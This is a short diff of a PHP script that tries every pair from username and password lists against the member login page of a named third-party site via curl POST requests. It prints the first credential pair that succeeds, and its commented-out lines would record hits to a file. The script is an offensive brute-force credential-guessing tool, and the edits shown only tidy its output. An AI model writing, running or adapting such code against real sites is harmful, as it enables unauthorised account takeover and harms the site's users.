@@ -29,12 +29,11 @@ $handle = fopen('account.txt', 'a+');
 $url = 'http://vip.88854.com/huiyuan/getin.cgi';
 foreach($username as $user){
   foreach ($passwd as $key => $pass) {
-    echo $post_string = "id=&username=".trim($user)."&passwd=".trim($pass);
+    $post_string = "id=&username=".trim($user)."&passwd=".trim($pass);
     if($temp = request_by_curl($url, $post_string)){
 		echo $post_string.'<br />';die;
-      //fwrite($handle, $post_string."\r\n");
-	  //fclose($handle);
-	  //die;
+      //fwrite($handle, "\r\n".$post_string);
+	  //fclose($handle);die;
     }
   }
 }
